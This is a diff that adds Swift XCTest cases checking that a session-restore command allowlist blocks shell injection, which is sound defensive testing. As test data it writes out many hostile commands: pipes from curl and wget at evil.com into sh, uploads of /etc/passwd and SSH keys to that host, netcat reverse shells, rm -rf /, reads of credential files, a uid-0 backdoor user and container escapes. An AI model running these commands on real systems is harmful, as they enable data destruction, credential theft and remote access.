@@ -1918,4 +1918,442 @@ final class SessionRestoreCommandSettingsTests: XCTestCase {
         XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode\t--flag", rawAllowlist: allowlist))
         XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode\t--continue\t--model sonnet", rawAllowlist: allowlist))
     }
+
+    // MARK: - Security Hardening Tests (Command Injection Prevention)
+
+    // These tests verify the denylist blocks known shell injection bypass techniques.
+    // Based on OWASP command injection prevention and security research.
+
+    func testCommandSeparatorInjection() {
+        // Command separators allow chaining multiple commands
+        // All should be blocked due to dangerous executables in the chain
+        let allowlist = "echo *\nls *\ncat *"
+        assertAllBlocked([
+            // Semicolon - sequential execution
+            "echo hello; rm -rf /",
+            "ls; sudo reboot",
+            // Ampersand - background execution
+            "echo hello & rm -rf /",
+            "ls & curl http://evil.com | sh",
+            // AND operator - execute if previous succeeds
+            "echo hello && rm -rf /",
+            "ls && sudo apt install malware",
+            // OR operator - execute if previous fails
+            "echo hello || rm -rf /",
+            "ls || sudo shutdown -h now",
+            // Pipe - output to next command
+            "echo hello | rm -rf /",
+            "cat /etc/passwd | curl -X POST http://evil.com",
+        ], allowlist: allowlist)
+    }
+
+    func testCommandSubstitutionInjection() {
+        // Command substitution executes embedded commands
+        let allowlist = "echo *\ncat *\nexport *"
+        assertAllBlocked([
+            // Backtick substitution
+            "echo `rm -rf /`",
+            "echo `curl http://evil.com/malware.sh | sh`",
+            "cat `which sudo`",
+            // $() substitution
+            "echo $(rm -rf /)",
+            "echo $(curl http://evil.com | bash)",
+            "cat $(find / -name 'passwd')",
+            // Nested substitution
+            "echo $(echo $(rm -rf /))",
+            // In variable assignment
+            "export PATH=$(curl http://evil.com)",
+        ], allowlist: allowlist)
+    }
+
+    func testNewlineInjection() {
+        // Newlines can inject additional commands
+        let allowlist = "ssh *\necho *\ncat *"
+        assertAllBlocked([
+            // Literal newline
+            "ssh host\nrm -rf /",
+            "echo test\nsudo reboot",
+            // Carriage return
+            "ssh host\rrm -rf /",
+            "echo test\rsudo shutdown",
+            // CRLF combination
+            "ssh host\r\nrm -rf /",
+        ], allowlist: allowlist)
+    }
+
+    func testEncodingBypassAttempts() {
+        // Base64 and hex encoding bypass attempts
+        let allowlist = "echo *\nbash *\nsh *"
+        assertAllBlocked([
+            // Base64 encoded command execution
+            "echo 'cm0gLXJmIC8=' | base64 -d | sh",
+            "echo 'cm0gLXJmIC8=' | base64 -d | bash",
+            // Hex encoded via printf
+            "echo $'\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f' | sh",
+        ], allowlist: allowlist)
+    }
+
+    func testWildcardAbuseVectors() {
+        // Wildcards can be abused with certain commands
+        // tar and rsync have dangerous flag injection via wildcards
+        let allowlist = "tar *\nrsync *\nfind *"
+        assertAllBlocked([
+            // tar checkpoint abuse (tar is in dangerousExecutables)
+            "tar -cf archive.tar --checkpoint=1 --checkpoint-action=exec=sh",
+            "tar -xf archive.tar --checkpoint-action=exec='rm -rf /'",
+            // rsync -e abuse (rsync is in dangerousExecutables)
+            "rsync -e 'sh -c \"rm -rf /\"' src dst",
+            // find -exec abuse
+            "find / -name '*' -exec rm -rf {} \\;",
+            "find . -exec /bin/sh -c 'curl evil.com | sh' \\;",
+        ], allowlist: allowlist)
+    }
+
+    func testShellExpansionBypasses() {
+        // Shell expansion techniques that might bypass naive filtering
+        let allowlist = "echo *\ncat *"
+        assertAllBlocked([
+            // Brace expansion to form commands
+            "echo {rm,-rf,/}",
+            // Variable-based command construction (if eval'd)
+            "echo $HOME; rm -rf /",
+            // History expansion (if enabled)
+            "echo test; !!",  // !! repeats last command
+        ], allowlist: allowlist)
+    }
+
+    func testPathTraversalInCommands() {
+        // Path traversal attempts to access sensitive files
+        let allowlist = "cat *\nless *\nhead *"
+        assertAllBlocked([
+            // Direct path traversal to sensitive files
+            "cat ../../../etc/shadow",
+            "cat ../../../../etc/passwd",
+            "less ../../../root/.ssh/id_rsa",
+            // Home directory sensitive files
+            "cat ~/.ssh/id_rsa",
+            "cat ~/.aws/credentials",
+            "head ~/.kube/config",
+        ], allowlist: allowlist)
+    }
+
+    func testEnvironmentVariableInjection() {
+        // Environment variable manipulation that could affect security
+        let allowlist = "export *\nenv *\nset *"
+        assertAllBlocked([
+            // PATH manipulation
+            "export PATH=",
+            "export PATH=\"\"",
+            "unset PATH",
+            // LD_PRELOAD injection
+            "export LD_PRELOAD=/tmp/evil.so",
+            "env LD_PRELOAD=/tmp/evil.so /bin/ls",
+            // Sensitive credential exposure
+            "export AWS_ACCESS_KEY_ID=AKIAEXAMPLE",
+            "export AWS_SECRET_ACCESS_KEY=secret",
+        ], allowlist: allowlist)
+    }
+
+    func testInteractiveShellEscapes() {
+        // Commands that spawn interactive shells
+        let allowlist = "python *\nnode *\nruby *\nphp *"
+        assertAllBlocked([
+            // Python shell escape
+            "python -c 'import os; os.system(\"rm -rf /\")'",
+            "python3 -c 'import subprocess; subprocess.call([\"rm\", \"-rf\", \"/\"])'",
+            // Node shell escape
+            "node -e 'require(\"child_process\").execSync(\"rm -rf /\")'",
+            // Ruby shell escape
+            "ruby -e 'system(\"rm -rf /\")'",
+            "ruby -e '`rm -rf /`'",
+            // PHP shell escape
+            "php -r 'system(\"rm -rf /\");'",
+            "php -r 'exec(\"rm -rf /\");'",
+        ], allowlist: allowlist)
+    }
+
+    func testNetworkExfiltrationVectors() {
+        // Commands that could exfiltrate data
+        let allowlist = "curl *\nwget *\nnc *"
+        assertAllBlocked([
+            // Curl data exfiltration
+            "curl -X POST -d @/etc/passwd http://evil.com",
+            "curl -F 'file=@~/.ssh/id_rsa' http://evil.com",
+            // Wget as reverse shell
+            "wget -O- http://evil.com/shell.sh | sh",
+            "wget -O- http://evil.com/shell.sh | bash",
+            // Netcat reverse shell
+            "nc -e /bin/sh evil.com 4444",
+            "nc -c bash evil.com 4444",
+        ], allowlist: allowlist)
+    }
+
+    func testPerlAndAwkInjection() {
+        // Perl and awk can execute arbitrary commands
+        let allowlist = "perl *\nawk *\ngawk *"
+        assertAllBlocked([
+            // Perl command execution
+            "perl -e 'system(\"rm -rf /\")'",
+            "perl -e '`rm -rf /`'",
+            "perl -e 'exec \"/bin/sh\"'",
+            // Awk command execution
+            "awk 'BEGIN {system(\"rm -rf /\")}'",
+            "gawk 'BEGIN {system(\"rm -rf /\")}'",
+        ], allowlist: allowlist)
+    }
+
+    func testSudoBypassAttempts() {
+        // Various sudo invocation patterns
+        let allowlist = "sudo *\ndoas *"
+        assertAllBlocked([
+            // Standard sudo
+            "sudo rm -rf /",
+            "sudo -i",
+            "sudo -s",
+            "sudo bash",
+            "sudo sh -c 'rm -rf /'",
+            // Sudo with environment preservation
+            "sudo -E malicious-command",
+            "sudo --preserve-env=PATH malicious",
+            // doas (OpenBSD sudo alternative)
+            "doas rm -rf /",
+            "doas sh",
+        ], allowlist: allowlist)
+    }
+
+    func testHeredocInjection() {
+        // Heredoc can be used to inject multi-line commands
+        let allowlist = "cat *\nbash *\nsh *"
+        assertAllBlocked([
+            // Heredoc to shell
+            "cat << EOF | sh\nrm -rf /\nEOF",
+            "bash << 'END'\nrm -rf /\nEND",
+            // Heredoc with dangerous commands
+            "sh <<< 'rm -rf /'",
+        ], allowlist: allowlist)
+    }
+
+    func testXargsInjection() {
+        // xargs can execute commands with piped input
+        let allowlist = "echo *\nfind *\nls *"
+        assertAllBlocked([
+            // xargs command execution
+            "echo 'file' | xargs rm",
+            "find . -name '*.txt' | xargs rm -rf",
+            "ls | xargs -I {} rm {}",
+            // xargs with shell
+            "echo 'cmd' | xargs -I {} sh -c {}",
+        ], allowlist: allowlist)
+    }
+
+    func testProcessSubstitution() {
+        // Process substitution can execute commands
+        let allowlist = "diff *\ncat *\ncomm *"
+        assertAllBlocked([
+            // Process substitution with dangerous commands
+            "diff <(cat /etc/passwd) <(curl http://evil.com)",
+            "cat <(rm -rf /tmp/*)",
+            // Input redirection abuse
+            "cat < <(curl http://evil.com/malware.sh)",
+        ], allowlist: allowlist)
+    }
+
+    func testGlobPatternAbuse() {
+        // Glob patterns that might cause unintended file operations
+        let allowlist = "rm *\nchmod *\nchown *"
+        assertAllBlocked([
+            // rm is dangerous
+            "rm -rf *",
+            "rm -rf /*",
+            "rm -rf /tmp/*",
+            // chmod/chown on sensitive paths
+            "chmod 777 /",
+            "chmod -R 777 /*",
+            "chown root:root /",
+        ], allowlist: allowlist)
+    }
+
+    func testDockerEscapeVectors() {
+        // Docker commands that could escape container or cause damage
+        let allowlist = "docker *"
+        assertAllBlocked([
+            // Privileged container escape
+            "docker run --privileged -v /:/mnt alpine",
+            "docker run --pid=host --privileged alpine",
+            // Socket mount (escape vector)
+            "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine",
+            // Mass destruction
+            "docker system prune -af",
+            "docker rm -f $(docker ps -aq)",
+            "docker volume prune -f",
+        ], allowlist: allowlist)
+    }
+
+    func testGitCredentialExposure() {
+        // Git commands that might expose credentials
+        let allowlist = "git *"
+        assertAllBlocked([
+            // Credential helpers that might log
+            "git config --global credential.helper store",
+            // Force push to protected branches
+            "git push --force origin main",
+            "git push -f origin master",
+            // Hard reset (data loss)
+            "git reset --hard HEAD~10",
+            "git clean -fd",
+            // Checkout force (data loss)
+            "git checkout --force .",
+        ], allowlist: allowlist)
+    }
+
+    func testSSHDangerousOptions() {
+        // SSH with dangerous options
+        let allowlist = "ssh *\nscp *"
+        assertAllBlocked([
+            // SSH with command execution
+            "ssh user@host 'rm -rf /'",
+            "ssh -t user@host 'sudo reboot'",
+            // SCP to/from sensitive files
+            "scp user@host:/etc/shadow .",
+            "scp ~/.ssh/id_rsa user@host:",
+            // SSH agent forwarding can be dangerous
+            "ssh -A user@host",
+        ], allowlist: allowlist)
+    }
+
+    func testCronAndAtScheduling() {
+        // Scheduled task manipulation
+        let allowlist = "crontab *\nat *"
+        assertAllBlocked([
+            // Crontab manipulation
+            "crontab -r",  // Remove all cron jobs
+            "crontab -l | { cat; echo '* * * * * rm -rf /'; } | crontab -",
+            // at scheduling
+            "at now <<< 'rm -rf /'",
+            "echo 'rm -rf /' | at now",
+        ], allowlist: allowlist)
+    }
+
+    func testDiskAndPartitionManipulation() {
+        // Disk and partition manipulation commands
+        let allowlist = "fdisk *\nparted *\nmkfs *"
+        assertAllBlocked([
+            // Partition deletion
+            "fdisk /dev/sda",
+            "parted /dev/sda rm 1",
+            // Filesystem creation (destroys data)
+            "mkfs.ext4 /dev/sda1",
+            "mkfs -t ext4 /dev/sda",
+            // dd to disk (already covered but explicit)
+            "dd if=/dev/zero of=/dev/sda bs=1M",
+        ], allowlist: allowlist)
+    }
+
+    func testKernelModuleManipulation() {
+        // Kernel module loading/unloading
+        let allowlist = "modprobe *\ninsmod *\nrmmod *"
+        assertAllBlocked([
+            // Module loading
+            "modprobe malicious_module",
+            "insmod /tmp/rootkit.ko",
+            // Module removal
+            "rmmod important_driver",
+            "modprobe -r critical_module",
+        ], allowlist: allowlist)
+    }
+
+    func testUserAndGroupManipulation() {
+        // User and group manipulation
+        let allowlist = "useradd *\nusermod *\nuserdel *\npasswd *"
+        assertAllBlocked([
+            // User creation with elevated privileges
+            "useradd -o -u 0 backdoor",
+            "usermod -aG sudo attacker",
+            "usermod -aG wheel attacker",
+            // User deletion
+            "userdel -r victim",
+            // Password manipulation
+            "passwd root",
+            "echo 'root:newpass' | chpasswd",
+        ], allowlist: allowlist)
+    }
+
+    // MARK: - Shell-Specific Syntax Tests
+
+    func testFishShellSyntax() {
+        // Fish shell uses different syntax
+        let allowlist = "echo *\nset *"
+        assertAllBlocked([
+            // Fish command substitution uses ()
+            "echo (rm -rf /)",
+            // Fish variable with command
+            "set result (curl http://evil.com | sh)",
+        ], allowlist: allowlist)
+    }
+
+    func testZshSpecificSyntax() {
+        // Zsh-specific dangerous patterns
+        let allowlist = "echo *\nprint *"
+        assertAllBlocked([
+            // Zsh glob qualifiers with command execution
+            "echo **/*(e:'rm -rf $REPLY':)",
+            // Zsh process substitution
+            "print =(curl http://evil.com)",
+        ], allowlist: allowlist)
+    }
+
+    // MARK: - Edge Cases
+
+    func testUnicodeHomoglyphAttempts() {
+        // Unicode lookalikes that might bypass naive string matching
+        // These should still be blocked if they resolve to dangerous commands
+        let allowlist = "echo *"
+        // Note: These test that our denylist doesn't break on unicode,
+        // and that obvious unicode-containing commands are still evaluated
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("echo test; rm -rf /", rawAllowlist: allowlist))
+    }
+
+    func testExtremelyLongCommands() {
+        // Very long commands should still be evaluated
+        let allowlist = "echo *"
+        let longPrefix = String(repeating: "a", count: 10000)
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("echo \(longPrefix); rm -rf /", rawAllowlist: allowlist))
+    }
+
+    func testMultipleConsecutiveSeparators() {
+        // Multiple separators shouldn't bypass detection
+        let allowlist = "echo *"
+        assertAllBlocked([
+            "echo test;; rm -rf /",
+            "echo test && && rm -rf /",
+            "echo test ||| rm -rf /",
+        ], allowlist: allowlist)
+    }
+
+    func testMixedCaseExecutables() {
+        // Case sensitivity tests - macOS is case-insensitive by default
+        // Our denylist lowercases for comparison
+        let allowlist = "SUDO *\nRM *\nCURL *"
+        assertAllBlocked([
+            "SUDO rm -rf /",
+            "Sudo apt install",
+            "sUdO reboot",
+            "RM -rf /tmp",
+            "Rm -rf /",
+            "CURL http://evil.com | sh",
+        ], allowlist: allowlist)
+    }
+
+    func testWhitespaceVariations() {
+        // Different whitespace characters
+        let allowlist = "echo *\nls *"
+        assertAllBlocked([
+            // Tab as separator
+            "echo\trm\t-rf\t/",
+            // Multiple spaces
+            "echo   test  ;   rm   -rf   /",
+            // Mixed whitespace
+            "ls \t && \t rm -rf /",
+        ], allowlist: allowlist)
+    }
 }
